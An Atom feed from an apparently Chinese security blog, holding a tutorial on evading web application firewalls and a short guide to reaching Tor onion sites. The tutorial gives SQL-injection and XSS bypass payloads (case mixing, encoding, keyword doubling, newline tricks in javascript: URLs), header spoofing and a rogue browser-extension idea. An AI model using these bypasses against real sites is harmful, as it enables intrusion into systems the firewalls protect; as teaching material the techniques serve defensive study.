<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Black-Hole&#39;s Blog</title>
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://bugs.cc/"/>
  <updated>2016-08-20T12:14:23.187Z</updated>
  <id>http://bugs.cc/</id>
  
  <author>
    <name>Black-Hole</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>杂谈如何绕过WAF（Web应用防火墙）</title>
    <link href="http://bugs.cc/2016/08/20/%E6%9D%82%E8%B0%88%E5%A6%82%E4%BD%95%E7%BB%95%E8%BF%87WAF%EF%BC%88Web%E5%BA%94%E7%94%A8%E9%98%B2%E7%81%AB%E5%A2%99%EF%BC%89/"/>
    <id>http://bugs.cc/2016/08/20/杂谈如何绕过WAF（Web应用防火墙）/</id>
    <published>2016-08-20T11:04:31.000Z</published>
    <updated>2016-08-20T12:14:23.187Z</updated>
    
    <content type="html">&lt;blockquote&gt;
&lt;h3 id=&quot;0×01-前言：&quot;&gt;&lt;a href=&quot;#0×01-前言：&quot; class=&quot;headerlink&quot; title=&quot;0×01 前言：&quot;&gt;&lt;/a&gt;0×01 前言：&lt;/h3&gt;&lt;/blockquote&gt;
&lt;p&gt;这个议题呢，主要是教大家一个思路，而不是把现成准备好的代码放给大家。&lt;/p&gt;
&lt;p&gt;可能在大家眼中WAF（Web应用防火墙）就是“不要脸”的代名词。如果没有他，我们的“世界”可能会更加美好。但是事与愿违。没有它，你让各大网站怎么活。但是呢，我是站在你们的这一边的，所以，今天我们就来谈谈如何绕过WAF吧。之所以叫做“杂谈”，是因为我在本次演讲里，会涉及到webkit、nginx&amp;amp;apache等。下面正式开始：）&lt;/p&gt;
&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;blockquote&gt;
&lt;h3 id=&quot;0x02-直视WAF：&quot;&gt;&lt;a href=&quot;#0x02-直视WAF：&quot; class=&quot;headerlink&quot; title=&quot;0x02 直视WAF：&quot;&gt;&lt;/a&gt;0x02 直视WAF：&lt;/h3&gt;&lt;/blockquote&gt;
&lt;p&gt;作为第一节，我先为大家简单的说下一些绕过WAF的方法。&lt;/p&gt;
&lt;h4 id=&quot;1、-大小写转换法：&quot;&gt;&lt;a href=&quot;#1、-大小写转换法：&quot; class=&quot;headerlink&quot; title=&quot;1、 大小写转换法：&quot;&gt;&lt;/a&gt;1、 大小写转换法：&lt;/h4&gt;&lt;p&gt;看字面就知道是什么意思了，就是把大写的小写，小写的大写。比如:&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;SQL：sEleCt vERsIoN();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;‍‍XSS：&amp;lt;sCrIpt&amp;gt;alert(1)&amp;lt;/script&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;出现原因：在waf里，使用的正则不完善或者是没有用大小写转换函数&lt;/p&gt;
&lt;h4 id=&quot;2、-干扰字符污染法&quot;&gt;&lt;a href=&quot;#2、-干扰字符污染法&quot; class=&quot;headerlink&quot; title=&quot;2、 干扰字符污染法:&quot;&gt;&lt;/a&gt;2、 干扰字符污染法:&lt;/h4&gt;&lt;p&gt;空字符、空格、TAB换行、注释、特殊的函数等等都可以。比如下面的：&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;SQL：sEleCt+1-1+vERsIoN   /*!*/       ();`yohehe‍‍&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;‍‍SQL2：select/*!*/`version`();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;XSS：下面一节会仔细的介绍&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h4 id=&quot;3、字符编码法：&quot;&gt;&lt;a href=&quot;#3、字符编码法：&quot; class=&quot;headerlink&quot; title=&quot;3、字符编码法：&quot;&gt;&lt;/a&gt;3、字符编码法：&lt;/h4&gt;&lt;p&gt;就是对一些字符进行编码，常见的SQL编码有unicode、HEX、URL、ascll、base64等，XSS编码有：HTML、URL、ASCII、JS编码、base64等等&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;SQL:load_file(0x633A2F77696E646F77732F6D792E696E69)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;‍‍‍‍XSS：&amp;lt;script%20src%3D&amp;quot;http%3A%2F%2F0300.0250.0000.0001&amp;quot;&amp;gt;&amp;lt;%2Fscript&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;出现原因：利用浏览器上的进制转换或者语言编码规则来绕过waf&lt;/p&gt;
&lt;h4 id=&quot;4、拼凑法&quot;&gt;&lt;a href=&quot;#4、拼凑法&quot; class=&quot;headerlink&quot; title=&quot;4、拼凑法&quot;&gt;&lt;/a&gt;4、拼凑法&lt;/h4&gt;&lt;p&gt;如果过滤了某些字符串，我们可以在他们两边加上“原有字符串”的一部分。&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;SQL：selselectect verversionsion();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;‍‍‍‍XSS：&amp;lt;scr&amp;lt;script&amp;gt;rip&amp;gt;alalertert&amp;lt;/scr&amp;lt;/script&amp;gt;rip&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;出现原因：利用waf的不完整性，只验证一次字符串或者过滤的字符串并不完整。&lt;/p&gt;
&lt;p&gt;本节是告诉大家，waf总会有自己缺陷的，任何事物都不可能完美。&lt;/p&gt;
&lt;blockquote&gt;
&lt;h3 id=&quot;0x03-站在webkit角度来说绕过WAF：&quot;&gt;&lt;a href=&quot;#0x03-站在webkit角度来说绕过WAF：&quot; class=&quot;headerlink&quot; title=&quot;0x03 站在webkit角度来说绕过WAF：&quot;&gt;&lt;/a&gt;0x03 站在webkit角度来说绕过WAF：&lt;/h3&gt;&lt;/blockquote&gt;
&lt;p&gt;可能这时会有人问到，说绕过WAF，怎么跑到webkit上去了。嗯，你没有看错，我也没有疯。之说以站在webkit角度来讲绕过WAF，是因为各个代码的功能是由浏览器来解析的。那浏览器中谁又负责解析呢？那就是webkit， 既然要说到webkit，那就不得不提webkit下的解析器——词法分析器，因为我们在绕过的时候，就是利用解析器中的词法分析器来完成。&lt;/p&gt;
&lt;p&gt;就比如一个简单的绕过WAF的XSS代码：&lt;/p&gt;
&lt;p&gt;&lt;code&gt;&amp;lt;iframe src=&amp;quot;java
script:alert(1)&amp;quot; height=0 width=0 /&amp;gt;&amp;lt;iframe&amp;gt; &amp;lt;!--Java和script是回车，al和ert是Tab换行符--&amp;gt;&lt;/code&gt;&lt;br&gt;他可以弹窗，可以为什么他可以弹窗呢？这里面有回车、换行符啊。想要理解，我们来看看webkit下的Source/javascriptcore/parser/lexer.cpp是怎么声明的吧。&lt;br&gt;&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;while&lt;/span&gt; (m_current != stringQuoteCharacter) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (UNLIKELY(m_current ==&lt;span class=&quot;string&quot;&gt;&#39;\\&#39;&lt;/span&gt;)) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (stringStart != currentSourcePtr() &amp;amp;&amp;amp; shouldBuildStrings)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            append8(stringStart, currentSourcePtr() - stringStart);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        shift();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        LChar escape = singleEscape(m_current);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (escape) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (shouldBuildStrings)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                record8(escape);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            shift();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125; &lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (UNLIKELY(isLineTerminator(m_current)))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            shiftLineTerminator();&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;注意倒数第二行里的isLineTerminator函数。这里我来说说大致的意思：所有的内容都在一个字符串里，用while逐字解析，遇到换行就跳过。然后在拼成一个没有分割符的字符串，所以这时的XSS代码成功弹窗了。&lt;br&gt;Webkit里的词法分析器里除了跳过换行符，还会跳过什么字符呢？&lt;/p&gt;
&lt;p&gt;子曰：还有回车等分隔符。&lt;/p&gt;
&lt;p&gt;根据webkit词法分析器的机制，我们就可以写更多的猥琐xss代码。&lt;/p&gt;
&lt;p&gt;下面再说说这个注意事项：&lt;/p&gt;
&lt;figure class=&quot;highlight html&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;iframe&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;src&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&quot;java&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;script:alert(1)&quot;&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;height&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;width&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;0&lt;/span&gt; /&amp;gt;&lt;/span&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;iframe&lt;/span&gt;&amp;gt;&lt;/span&gt;  &lt;span class=&quot;comment&quot;&gt;&amp;lt;!--这个可以弹窗--&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;iframe&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;src&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;java&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;attr&quot;&gt;script:alert&lt;/span&gt;(&lt;span class=&quot;attr&quot;&gt;1&lt;/span&gt;); &lt;span class=&quot;attr&quot;&gt;height&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;width&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;0&lt;/span&gt; /&amp;gt;&lt;/span&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;iframe&lt;/span&gt;&amp;gt;&lt;/span&gt;  &lt;span class=&quot;comment&quot;&gt;&amp;lt;!--这个不可以弹窗--&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;因为在webkit的词法分析器里，跳过回车、换行等分隔符时有个前提，那就是必须用单/双引号围住，不然不会跳过。因为如果不使用引号，词法分析器会认为 回车、换行就是结束了，如果你运行上面这段代码，webkit会把java当做地址传给src。词法分析器跳过的前提就是建立在引号里的，切记。&lt;br&gt;这里在说一个：&lt;/p&gt;
&lt;p&gt;回车、换行只在属性中引号里才会起作用。如果你对标签或者属性用 回车、换行，这时你大可放心，决对不会弹窗。而且在属性值里 回车、换行随便用。如果空格出现在xss代码里并不会弹窗，但是如果出现在字符和符号之前，就可以弹了。如图：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xppwd.com1.z0.glb.clouddn.com//passwaf/1.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;注意事项：&lt;br&gt;跳过回车和换行，不支持on事件。例如下面的代码&lt;br&gt;&lt;code&gt;&amp;lt;a href=&amp;quot;java    script:alert(1)&amp;quot;&amp;gt;xss&amp;lt;/a&amp;gt;&lt;/code&gt;会弹窗，但是下面的代码就不行了。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;&amp;lt;a href=&amp;quot;#&amp;quot; onclick=&amp;quot;aler    t(1)&amp;quot;&amp;gt;s&amp;lt;/a&amp;gt;&lt;/code&gt;可见加了Tab换行，就无法弹窗了。但是还是支持字符和符号之间加入空格的。&lt;br&gt;本节就是告诉大家，想要玩的更好，最好追溯到底层，从底层来看攻击手法，你会发现很多问题迎刃而解。&lt;/p&gt;
&lt;blockquote&gt;
&lt;h3 id=&quot;0x04-利用Nginx-amp-Apache环境-BUG来绕过waf：&quot;&gt;&lt;a href=&quot;#0x04-利用Nginx-amp-Apache环境-BUG来绕过waf：&quot; class=&quot;headerlink&quot; title=&quot;0x04 利用Nginx&amp;amp;Apache环境 BUG来绕过waf：&quot;&gt;&lt;/a&gt;0x04 利用Nginx&amp;amp;Apache环境 BUG来绕过waf：&lt;/h3&gt;&lt;/blockquote&gt;
&lt;p&gt;这个bug比较鸡肋，需要在nginx&amp;amp;apache环境，而且管理员较大意。这是一个不是bug的bug。&lt;br&gt;当网站采用前端Nginx，后端Apache时，需要在conf配置，当遇到PHP后缀的时候，把请求交给Apache处理。但是Nginx判断后缀是否为PHP的原理是根据URL的。也就是说如果当URL的后缀不是PHP的时候，他并不会把PHP教给Apache处理。&lt;br&gt;配置:&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xppwd.com1.z0.glb.clouddn.com//passwaf/2.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;乍一看，没什么问题。但是这里隐藏一个漏洞。&lt;/p&gt;
&lt;p&gt;我在test目录建立一个index.php：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xppwd.com1.z0.glb.clouddn.com//passwaf/3.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;利用nginx&amp;amp;apache这个bug，再加上浏览器默认会隐藏index.php文件名，那么漏洞就来了。&lt;br&gt;访问&lt;code&gt;a.cn/test/index.php?text=&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;&lt;/code&gt;不会弹窗，被waf.conf给拦截了。&lt;/p&gt;
&lt;p&gt;访问&lt;code&gt;a.cn/test/?text=&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;&lt;/code&gt;会弹窗，没有被waf.conf给拦截，因为nginx根据URL判断这不是php文件，并没有交给apache处理，也就没有走第三个location流程。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xppwd.com1.z0.glb.clouddn.com//passwaf/4.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;本节是告诉大家，绕过WAF不用一直针对WAF，也可以利用环境/第三方的缺陷来绕过。&lt;/p&gt;
&lt;blockquote&gt;
&lt;h3 id=&quot;0x05-从HTTP数据包开始说起：&quot;&gt;&lt;a href=&quot;#0x05-从HTTP数据包开始说起：&quot; class=&quot;headerlink&quot; title=&quot;0x05 从HTTP数据包开始说起：&quot;&gt;&lt;/a&gt;0x05 从HTTP数据包开始说起：&lt;/h3&gt;&lt;/blockquote&gt;
&lt;p&gt;1、 现在有一部分网站waf是部署在客户端上的，利用burp、fiddler就可以轻松绕过。&lt;br&gt;很多时候我们遇到的情况就像这段代码一样:&lt;br&gt;&lt;figure class=&quot;highlight html&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;input&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;type&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&quot;text&quot;&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;name&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&quot;text&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;input&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;type&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&quot;submit&quot;&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;onclick&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&quot;waf()&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;把waf规则放到js里。我们可以提交一个woaini字符串，然后用burp、fiddler抓包、改包、提交，轻轻松松的绕过了客服端的WAF机制。&lt;/p&gt;
&lt;p&gt;2、有的网站，他们对百度、google、soso、360等爬虫请求并不过滤，这时我们就可以在USER-Agent伪造自己是搜索引擎的爬虫，就可以绕过waf&lt;/p&gt;
&lt;p&gt;3、有的网站使用的是$_REQUEST来接受get post cookie参数的，这时如果waf只对GET POST参数过滤了，那么久可以在数据包里对cookie进行构造攻击代码，来实现绕过waf。&lt;/p&gt;
&lt;p&gt;4、有的waf对GET POST COOKIE都过滤了，还可以进行绕过。怎么绕过呢？&lt;br&gt;假设网站会显示你的IP或者你使用的浏览器，那么你就可以对IP、user-agent进行构造，在PHP里X_FORWARDED_FOR和HTTP_CLIENT_IP两个获取IP的函数都可以被修改。&lt;br&gt;想详细了解的可以去：&lt;a href=&quot;http://www.freebuf.com/articles/web/42727.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://www.freebuf.com/articles/web/42727.html&lt;/a&gt; 0x06节。&lt;br&gt;本节告诉我们waf是死的，人是活的，思想放开。不要跟着WAF的思路走，走出自己的思路，才是最正确的。&lt;/p&gt;
&lt;blockquote&gt;
&lt;h3 id=&quot;0x06-WAF你算个屌：&quot;&gt;&lt;a href=&quot;#0x06-WAF你算个屌：&quot; class=&quot;headerlink&quot; title=&quot;0x06 WAF你算个屌：&quot;&gt;&lt;/a&gt;0x06 WAF你算个屌：&lt;/h3&gt;&lt;/blockquote&gt;
&lt;p&gt;很多人认为绕过WAF需要根据WAF的规则来绕过。但是我们可以忽视他，进行攻击。&lt;br&gt;我们利用第三方插件来进行攻击，因为第三方插件的权限非常大，而且他有一个特殊的性质，就是他可以跨域。&lt;br&gt;我们可以事先在插件里调用一个js代码，对方安装之后浏览任何网站都可以被XSS。&lt;br&gt;我们现在来看段Maxthon插件的源码：&lt;/p&gt;
&lt;p&gt;def.json&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xppwd.com1.z0.glb.clouddn.com//passwaf/5.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;test.js：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xppwd.com1.z0.glb.clouddn.com//passwaf/6.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;统一放在一个文件夹里，再用Mxpacke.exe生成一个遨游插件。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xppwd.com1.z0.glb.clouddn.com//passwaf/7.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;双击就可以安装这个插件。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xppwd.com1.z0.glb.clouddn.com//passwaf/8.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xppwd.com1.z0.glb.clouddn.com//passwaf/9.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;。这不算是一个漏洞，因为插件必须要运行js代码，而XSS的宗旨就是 在网站里运行你所指定的js代码。&lt;br&gt;所以，这个xss没办法修复，而且chrome 火狐 等浏览器都存在。&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;h3 id=&quot;0×01-前言：&quot;&gt;&lt;a href=&quot;#0×01-前言：&quot; class=&quot;headerlink&quot; title=&quot;0×01 前言：&quot;&gt;&lt;/a&gt;0×01 前言：&lt;/h3&gt;&lt;/blockquote&gt;
&lt;p&gt;这个议题呢，主要是教大家一个思路，而不是把现成准备好的代码放给大家。&lt;/p&gt;
&lt;p&gt;可能在大家眼中WAF（Web应用防火墙）就是“不要脸”的代名词。如果没有他，我们的“世界”可能会更加美好。但是事与愿违。没有它，你让各大网站怎么活。但是呢，我是站在你们的这一边的，所以，今天我们就来谈谈如何绕过WAF吧。之所以叫做“杂谈”，是因为我在本次演讲里，会涉及到webkit、nginx&amp;amp;apache等。下面正式开始：）&lt;/p&gt;
    
    </summary>
    
    
      <category term="WEB安全" scheme="http://bugs.cc/tags/WEB%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>暗网</title>
    <link href="http://bugs.cc/2016/08/20/%E6%9A%97%E7%BD%91/"/>
    <id>http://bugs.cc/2016/08/20/暗网/</id>
    <published>2016-08-20T05:40:21.000Z</published>
    <updated>2016-08-20T07:11:16.494Z</updated>
    
    <content type="html">&lt;h3 id=&quot;最后更新时间-2016-8-20-13-40-21&quot;&gt;&lt;a href=&quot;#最后更新时间-2016-8-20-13-40-21&quot; class=&quot;headerlink&quot; title=&quot;最后更新时间:2016/8/20 13:40:21&quot;&gt;&lt;/a&gt;最后更新时间:2016/8/20 13:40:21&lt;/h3&gt;&lt;hr&gt;
&lt;h4 id=&quot;利用暗网进行浏览onion的流程：&quot;&gt;&lt;a href=&quot;#利用暗网进行浏览onion的流程：&quot; class=&quot;headerlink&quot; title=&quot;利用暗网进行浏览onion的流程：&quot;&gt;&lt;/a&gt;&lt;code&gt;利用暗网进行浏览onion的流程：&lt;/code&gt;&lt;/h4&gt;&lt;p&gt;大陆用户，首先需要代理VPN，或者使用“蓝灯（lantern）”。来进行从tor服务器那里获得tor节点，从而进行连接，不用嫌麻烦，多层代理总是好的，虽然在tor浏览器里可以直接使用“伪造其他网站的数据传输”来进行浏览，但是缺点是慢，且不安全。详细的用法可以看这篇文章&lt;a href=&quot;http://www.chinagfw.org/2016/06/tor.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://www.chinagfw.org/2016/06/tor.html&lt;/a&gt; (需要VPN或者lantern访问)&lt;/p&gt;
&lt;h2 id=&quot;&quot;&gt;&lt;a href=&quot;#&quot; class=&quot;headerlink&quot; title=&quot;&quot;&gt;&lt;/a&gt;&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;h4 id=&quot;暗网的介绍：&quot;&gt;&lt;a href=&quot;#暗网的介绍：&quot; class=&quot;headerlink&quot; title=&quot;暗网的介绍：&quot;&gt;&lt;/a&gt;&lt;code&gt;暗网的介绍：&lt;/code&gt;&lt;/h4&gt;&lt;p&gt;因为介绍暗网的文章很多，我这里选一些比较好的文章&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://kejiweixun.com/?p=585&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;这是我第一次访问暗网&lt;/a&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h4 id=&quot;暗网一些推荐的网站：&quot;&gt;&lt;a href=&quot;#暗网一些推荐的网站：&quot; class=&quot;headerlink&quot; title=&quot;暗网一些推荐的网站：&quot;&gt;&lt;/a&gt;&lt;code&gt;暗网一些推荐的网站：&lt;/code&gt;&lt;/h4&gt;&lt;p&gt;&lt;a href=&quot;http://mail2tor2zyjdctd.onion&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;暗网邮箱&lt;/a&gt;&lt;br&gt;推荐用这个，gmail不安全，其他的临时邮箱不稳定，这个时候就需要一个可以在暗网上即使被破解也没办法知道你是谁的稳定邮箱。为了安全起见，你可以注册这样的邮箱：&lt;code&gt;wufnxlkfog7458bk@mail2tor.com&lt;/code&gt;，密码也可以起成&lt;code&gt;tusncjdnah@*%41We&lt;/code&gt;，不用担心忘记，后面我会说在么记录这些账户密码，而且别人无法获取的方法。&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://xkow4dnkw7cusncz.onion&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;暗网中文论坛&lt;/a&gt;&lt;br&gt;在暗网上，这个中文论坛应该是最大的了。适合刚入门的新手，做一个过渡。&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://hss3uro2hsxfogfq.onion/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;not Evil&lt;/a&gt; 支持中文搜索的暗网搜索引擎，没有广告&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://xmh5752oemp2sztk.onion/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;TORCH&lt;/a&gt; 另一个搜索引擎&lt;/p&gt;
